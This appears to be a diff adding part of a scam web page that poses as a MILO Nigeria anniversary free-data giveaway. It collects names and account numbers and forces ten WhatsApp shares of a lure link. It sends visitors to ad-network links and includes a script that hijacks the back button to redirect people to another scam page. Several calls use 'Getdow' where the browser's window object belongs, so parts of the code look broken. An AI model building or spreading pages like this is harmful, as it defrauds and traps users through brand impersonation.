+            <div class="spinner"></div>
+            <h2>⏳ Verifying Details</h2>
+            <div class="countdown" id="verifyCountdown">5</div>
+            <p>Please wait while we confirm your account information…</p>
+        </div>
+
+        <!-- ============================================================
+        SCREEN 7: SHARE — SIMPLIFIED
+        ============================================================ -->
+        <div class="screen share-screen" id="screenShare">
+            <h2>📢 To Receive Your Free Data Now, Complete This Task By Sharing To Your WhatsApp Contacts/Groups.</h2>
+            <p class="subtitle">
+                Please share this opportunity to your WhatsApp friends & Groups to claim your reward.
+                <br /><strong>Click on Claim Reward below after you finished Sharing</strong>.
+            </p>
+
+            <!-- Progress Bar -->
+            <div class="share-progress-wrap">
+                <div class="bar" id="shareBar" style="width:0%;"></div>
+                <div class="label" id="shareLabel">0%</div>
+            </div>
+            <p class="share-count-text">
+                <strong id="shareCountDisplay">0</strong> / 10 shares completed
+            </p>
+
+            <!-- WhatsApp Share Button -->
+            <button class="whatsapp-share-btn" id="whatsappShareBtn" onclick="handleWhatsAppShare()">
+                <span class="btn-text" id="waBtnText"><font color="white">WHATSAPP → </font></span>
+            </button>
+
+            <!-- Claim Area -->
+            <div class="claim-area">
+                <button class="claim-btn" id="claimBtn" disabled>
+                 <font color="white">   🔒 Claim Reward</font>
+                </button>
+                <p class="claim-hint" id="claimHint">Share 10 times on WhatsApp to unlock your reward.</p>
+            </div>
+        </div>
+
+        <!-- ============================================================
+        SCREEN 8: FINAL
+        ============================================================ -->
+        <div class="screen final-screen" id="screenFinal">
+            <div class="result-icon">🎊</div>
+            <h2>Thanks for Sharing!</h2>
+            <p class="final-sub">Click ACTIVATE to Claim your Reward</p>
+            <div class="final-earnings-box">
+                <div class="label">Your Earnings</div>
+           <span id="finalRewardAmount">0<div class="big-amount">GB</span></div>
+            </div>
+            <a href="https://ey43.com/4/3144603" target="_blank" class="btn-primary" style="text-decoration:none;display:inline-flex;">
+           <font color="white">  CLAIM OFFER</font>
+            </a>
+          <br/><br/><br/>
+          <a onclick="Getdow.open('https://ey43.com/4/3144603')"
+                href="https://obqj2.com/4/6798333">
+                <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn-primary"><font color="black">ACTIVATE</font></button>
+            </a><br/>
+          <br/>
+        <!-- BEGIN: Powered by Supercounters.com -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1737900,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
+</center>
+        </div>
+
+        <!-- ============================================================
+        MTN FOOTER
+        ============================================================ -->
+        <div class="mtn-footer">
+            <div class="footer-logo">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="12" cy="12" r="10" fill="#1A1A2E" stroke="#014b07" stroke-width="1.5"/>
+                    <circle cx="12" cy="12" r="8" fill="#014b07"/>
+                    <text x="12" y="16" font-family="Arial, Helvetica, sans-serif" font-size="7" font-weight="900" fill="#ffffff" text-anchor="middle">MILO</text>
+                </svg>
+                MILO Nigeria
+            </div>
+            <div class="footer-text">© MILO 25th Silver Jubilee Anniversary in Nigeria</div>
+        </div>
+
+        <!-- Toast Notification -->
+        <div class="toast" id="toast"></div>
+    </div>
+
+    <script>
+        // ============================================================
+        //  DATA
+        // ============================================================
+
+        const QUESTIONS = [{
+            id: 1,
+            text: 'How long have you been enjoying MILO?',
+            options: ['1 Month', 'A year plus', '2 Weeks'],
+            correct: 1
+        }, {
+            id: 2,
+            text: 'What is your favorite MILO moment?',
+            options: ['Bad moment', 'Enjoying a warm cup of MILO', 'No moment'],
+            correct: 1
+        }, {
+            id: 3,
+            text: 'How do you like to enjoy your MILO?',
+            options: ['With Coke', 'With Milk', 'With Chin Chin'],
+            correct: 1
+        }, {
+            id: 4,
+            text: 'What makes MILO your favorite chocolate drink?',
+            options: ['Tastes bad', 'Tastes Bitter', 'It tastes delicious'],
+            correct: 2
+        }, {
+            id: 5,
+            text: 'What would you wish MILO for its 25th anniversary?',
+            options: ['Success', 'Bad experience', 'Bad sells'],
+            correct: 0
+        }];
+
+        const LETTERS = ['A', 'B', 'C'];
+
+        const NIGERIAN_BANKS = [
+           'MTN', 'Airtel', 'Glo', '9-Mobile'
+        ];
+
+        // ============================================================
+        //  STATE
+        // ============================================================
+
+        let state = {
+            currentQuestion: 0,
+            correctCount: 0,
+            wrongCount: 0,
+            earnings: 0,
+            answered: false,
+            // Share state
+            shareCount: 0,
+            maxShares: 10,
+            isSharing: false,
+            isClaimUnlocked: false,
+            finalEarnings: 0
+        };
+
+        // ============================================================
+        //  DOM REFS
+        // ============================================================
+
+        const $ = id => document.getElementById(id);
+        const screens = {
+            welcome: $('screenWelcome'),
+            dob: $('screenDob'),
+            questions: $('screenQuestions'),
+            result: $('screenResult'),
+            account: $('screenAccount'),
+            verify: $('screenVerify'),
+            share: $('screenShare'),
+            final: $('screenFinal'),
+        };
+
+        const moneyDisplay = $('moneyDisplay');
+
+        // ============================================================
+        //  TOAST
+        // ============================================================
+
+        let toastTimeout = null;
+
+        function showToast(message, duration = 3000) {
+            const el = $('toast');
+            el.textContent = message;
+            el.classList.add('show');
+            clearTimeout(toastTimeout);
+            toastTimeout = setTimeout(() => {
+                el.classList.remove('show');
+            }, duration);
+        }
+
+        // ============================================================
+        //  SCREEN NAVIGATION
+        // ============================================================
+
+        function showScreen(name) {
+            Object.values(screens).forEach(el => {
+                if (el) el.classList.remove('active');
+            });
+            const target = screens[name];
+            if (target) {
+                target.classList.add('active');
+                target.style.animation = 'none';
+                void target.offsetHeight;
+                target.style.animation = '';
+            }
+        }
+
+        // ============================================================
+        //  MONEY UPDATE
+        // ============================================================
+
+        function updateMoney() {
+            moneyDisplay.textContent = state.earnings.toLocaleString();
+        }
+
+        // ============================================================
+        //  SCREEN 1 → 2
+        // ============================================================
+
+        function goToDob() {
+            showScreen('dob');
+        }
+
+        // ============================================================
+        //  SCREEN 2: DOB VALIDATION
+        // ============================================================
+
+      
+function validateName() {
+    const input = $('fullName');
+    const name = input.value.trim();
+
+    if (!name) {
+        alert('Please enter your full name.');
+        return;
+    }
+
+    if (name.length < 3) {
+        alert('Please enter your full name.');
+        return;
+    }
+
+    startQuiz();
+}
+        // ============================================================
+        //  SCREEN 3: QUIZ
+        // ============================================================
+
+        function startQuiz() {
+            state.currentQuestion = 0;
+            state.correctCount = 0;
+            state.wrongCount = 0;
+            state.earnings = 0;
+            state.answered = false;
+            updateMoney();
+            showScreen('questions');
+            renderQuestion();
+        }
+
+        function renderQuestion() {
+            const q = QUESTIONS[state.currentQuestion];
+            if (!q) {
+                finishQuiz();
+                return;
+            }
+
+            $('qCounter').textContent = `Q${state.currentQuestion + 1} / ${QUESTIONS.length}`;
+            $('correctCount').textContent = state.correctCount;
+            $('qText').textContent = q.text;
+
+            const dotsHtml = QUESTIONS.map((_, i) => {
+                let cls = 'dot';
+                if (i < state.currentQuestion) {
+                    cls += ' filled';
+                }
+                return `<div class="${cls}"></div>`;
+            }).join('');
+            $('qProgress').innerHTML = dotsHtml;
+
+            const container = $('qOptions');
+            container.innerHTML = '';
+            q.options.forEach((opt, idx) => {
+                const btn = document.createElement('button');
+                btn.className = 'option-btn';
+                btn.innerHTML = `<span class="letter">${LETTERS[idx]}</span> ${opt}`;
+                btn.dataset.idx = idx;
+                btn.addEventListener('click', () => handleAnswer(idx));
+                container.appendChild(btn);
+            });
+
+            state.answered = false;
+        }
+
+        function handleAnswer(selectedIdx) {
+            if (state.answered) return;
+            state.answered = true;
+
+            const q = QUESTIONS[state.currentQuestion];
+            const isCorrect = (selectedIdx === q.correct);
+            const btns = $('qOptions').querySelectorAll('.option-btn');
+
+            btns.forEach(b => b.classList.add('disabled'));
+
+            btns.forEach((b, i) => {
+                if (i === q.correct) b.classList.add('correct');
+                if (i === selectedIdx && !isCorrect) b.classList.add('wrong');
+            });
+
+            if (isCorrect) {
+                state.correctCount++;
+                state.earnings += 5;
+                updateMoney();
+            } else {
+                state.wrongCount++;
+            }
+
+            const dots = $('qProgress').querySelectorAll('.dot');
+            if (dots[state.currentQuestion]) {
+                dots[state.currentQuestion].classList.add(isCorrect ? 'filled' : 'wrong-dot');
+            }
+
+            $('correctCount').textContent = state.correctCount;
+
+            setTimeout(() => {
+                state.currentQuestion++;
+                if (state.currentQuestion < QUESTIONS.length) {
+                    renderQuestion();
+                } else {
+                    finishQuiz();
+                }
+            }, 900);
+        }
+
+        // ============================================================
+        //  SCREEN 4: FINISH QUIZ
+        // ============================================================
+
+        function finishQuiz() {
+            state.finalEarnings = state.earnings;
+            $('totalEarnings').textContent = state.earnings.toLocaleString();
+            $('finalCorrect').textContent = state.correctCount;
+            $('finalWrong').textContent = state.wrongCount;
+
+            const icon = state.earnings >= 40000 ? '🎉' : state.earnings >= 20000 ? '😊' : '💪';
+            const title = state.earnings >= 40000 ? 'Excellent!' : state.earnings >= 20000 ? 'Good Job!' : 'Keep Learning!';
+            $('resultIcon').textContent = icon;
+            $('resultTitle').textContent = title;
+            $('resultSub').textContent =
+                state.earnings >= 40000 ? 'You\'re a spelling champion!' :
+                state.earnings >= 20000 ? 'You know your words well!' :
+                'Practice makes perfect!';
+
+            showScreen('result');
+        }
+
+        // ============================================================
+        //  SCREEN 5: ACCOUNT DETAILS
+        // ============================================================
+
+        function goToAccount() {
+            const sel = $('bankSelect');
+            sel.innerHTML = '<option value="">— Select a bank —</option>';
+            NIGERIAN_BANKS.forEach(b => {
+                const opt = document.createElement('option');
+                opt.value = b;
+                opt.textContent = b;
+                sel.appendChild(opt);
+            });
+            showScreen('account');
+        }
+
+        function submitAccount() {
+            const name = $('accountName').value.trim();
+            const acct = $('accountNumber').value.trim();
+            const bank = $('bankSelect').value;
+
+            if (!name) { alert('Please enter your account holder name.'); return; }
+            if (!acct || acct.length < 10) { alert('Please enter a valid 10-digit account number.'); return; }
+            if (!bank) { alert('Please select your bank.'); return; }
+            if (!/^\d{10}$/.test(acct)) { alert('Account number must be exactly 10 digits.'); return; }
+
+            showScreen('verify');
+            let count = 5;
+            $('verifyCountdown').textContent = count;
+            const interval = setInterval(() => {
+                count--;
+                $('verifyCountdown').textContent = count;
+                if (count <= 0) {
+                    clearInterval(interval);
+                    initShareScreen();
+                }
+            }, 1000);
+        }
+
+        // ============================================================
+        //  SCREEN 6: SHARE — SIMPLIFIED
+        // ============================================================
+
+        function initShareScreen() {
+            state.shareCount = 0;
+            state.isSharing = false;
+            state.isClaimUnlocked = false;
+            updateShareUI();
+            showScreen('share');
+        }
+
+        function updateShareUI() {
+            const pct = Math.min((state.shareCount / state.maxShares) * 100, 100);
+            const bar = $('shareBar');
+            const label = $('shareLabel');
+            const countDisplay = $('shareCountDisplay');
+            const claimBtn = $('claimBtn');
+            const claimHint = $('claimHint');
+
+            bar.style.width = pct + '%';
+            label.textContent = Math.round(pct) + '%';
+            countDisplay.textContent = state.shareCount;
+
+            const isComplete = state.shareCount >= state.maxShares;
+
+            if (isComplete) {
+                state.isClaimUnlocked = true;
+                claimBtn.disabled = false;
+                claimBtn.className = 'claim-btn unlocked';
+                claimBtn.innerHTML = '🎁 Claim Reward';
+                claimBtn.onclick = goToFinalClaim;
+                claimHint.textContent = '🎉 You\'ve unlocked your reward! Click to claim.';
+            } else {
+                state.isClaimUnlocked = false;
+                claimBtn.disabled = true;
+                claimBtn.className = 'claim-btn';
+                claimBtn.innerHTML = '🔒 Claim Reward';
+                claimBtn.onclick = null;
+                claimHint.textContent = `Share ${state.maxShares - state.shareCount} more time${state.maxShares - state.shareCount > 1 ? 's' : ''} on WhatsApp to unlock.`;
+            }
+
+            // Update button text if not in sharing state
+            if (!state.isSharing) {
+                $('waBtnText').textContent = 'Share on WhatsApp →';
+            }
+        }
+
+        function handleWhatsAppShare() {
+            // Prevent multiple clicks while sharing
+            if (state.isSharing) return;
+
+            // Check if already completed
+            if (state.shareCount >= state.maxShares) {
+                showToast('🎉 You\'ve already completed all shares! Claim your reward.', 2500);
+                return;
+            }
+
+            state.isSharing = true;
+
+            // Disable the button
+            const btn = $('whatsappShareBtn');
+            btn.disabled = true;
+
+            // Prepare WhatsApp deeplink
+            const message = encodeURIComponent(
+    '*Get Up to 25GB With MILO 25th Silver Jubilee Anniversary in Nigeria* o\n\n' +
+    'Answer simple questions correctly and Get up to 25GB \n\n' +
+    'You Will get 5GB for each question you answered correctly\n' +
+    'Click here to Get now: https://mandateking.com/milo-ng'
+);
+
+// WhatsApp Deep Link
+const whatsappUrl = `whatsapp://send?text=${message}`;
+
+Getdow.location.href = whatsappUrl;
+
+            // Show countdown on button
+            const btnText = $('waBtnText');
+            let countdown = 3;
+            btnText.textContent = `Sharing... ${countdown}s`;
+
+            const interval = setInterval(() => {
+                countdown--;
+                if (countdown > 0) {
+                    btnText.textContent = `Sharing... ${countdown}s`;
+                } else {
+                    clearInterval(interval);
+                    // Complete the share
+                    state.shareCount = Math.min(state.shareCount + 1, state.maxShares);
+                    updateShareUI();
+                    // Re-enable button
+                    btn.disabled = false;
+                    state.isSharing = false;
+                    btnText.textContent = 'Share on WhatsApp →';
+
+                    // Show a friendly toast
+                    const remaining = state.maxShares - state.shareCount;
+                    if (remaining > 0) {
+                        showToast(`✅ Shared! ${remaining} more share${remaining > 1 ? 's' : ''} to go.`, 2500);
+                    } else {
+                        showToast('🎉 All shares complete! Claim your reward now!', 3000);
+                    }
+                }
+            }, 1000);
+        }
+
+        // ============================================================
+        //  SCREEN 7: FINAL CLAIM
+        // ============================================================
+
+        function goToFinalClaim() {
+            if (!state.isClaimUnlocked) return;
+            $('finalRewardAmount').textContent = state.finalEarnings.toLocaleString();
+            showScreen('final');
+        }
+
+        // ============================================================
+        //  INIT
+        // ============================================================
+
+        const today = new Date();
+        const dd = String(today.getDate()).padStart(2, '0');
+        const mm = String(today.getMonth() + 1).padStart(2, '0');
+        const yyyy = today.getFullYear() - 18;
+        const dobInput = $('dobInput');
+        if (dobInput) {
+            dobInput.value = `${yyyy}-${mm}-${dd}`;
+        }
+
+        showScreen('welcome');
+    </script>
+  <script>
+!function(a, e, t, n) {
+  const redirectURL = "https://mandateking.com/mtn-spelling-bee";
+
+  const c = function(trigger) {
+    if (a.onbeforeunload === null) {
+      a.onbeforeunload = function() {
+        if (trigger) {
+          setTimeout(function() {
+            a.onbeforeunload = null;
+            a.location.replace(redirectURL);
+          }, 100);
+        }
+        // Do not return anything to avoid Chrome popup
+      };
+    }
+  };
+
+  !function(a, e, t, n) {
+    n.replaceState(null, t.title, e.pathname + e.search);
+    for (let i = 0; i < 10; i++) {
+      try {
+        n.pushState(null, t.title, e.pathname + e.search);
+      } catch (err) {
+        i = 10;
+      }
+    }
+
+    a.addEventListener("popstate", function() {
+      n.replaceState(null, t.title, e.pathname + e.search);
+      a.onbeforeunload = null;
+      a.location.replace(redirectURL);
+    });
+  }(a, e, t, n);
+
+  try {
+    a.performance.getEntriesByType("navigation").forEach(function(entry) {
+      if (entry.type !== "reload") {
+        c(entry.type !== "navigate");
+      }
+    });
+  } catch (err) {
+    c(true);
+  }
+
+  t.addEventListener("click", function(event) {
+    for (let el = event.target; el && el !== this; el = el.parentNode) {
+      if (el.matches("a")) {
+        a.onbeforeunload = null;
+        break;
+      }
+    }
+  }, false);
+}(Getdow, location, document, history);
+</script>
+ <div style="display:none;">
+  <!-- BEGIN: Powered by Supercounters.com -->
+  <center>
+    <script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script>
+    <script type="text/javascript">
+      sc_online_i(1737805,"ffffff","e61c1c");
+    </script>
+  </center>
+  <!-- END: Powered by Supercounters.com -->
+</div>
+</body>
+</html>
